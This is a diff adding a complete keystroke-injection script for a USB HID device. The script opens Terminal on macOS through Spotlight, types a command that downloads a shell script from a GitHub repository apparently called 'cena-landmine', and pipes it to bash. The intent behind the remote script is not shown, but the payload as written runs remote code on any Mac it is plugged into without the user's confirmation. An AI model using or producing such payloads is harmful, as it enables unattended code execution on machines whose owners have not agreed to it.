@@ -1,0 +1,9 @@
+DEFAULTCHARDELAY 200
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING terminal
+ENTER
+DELAY 5000
+STRING curl -fsSL https://raw.githubusercontent.com/Ocanath/cena-landmine/master/scripts/install_macos.sh | bash
+ENTER
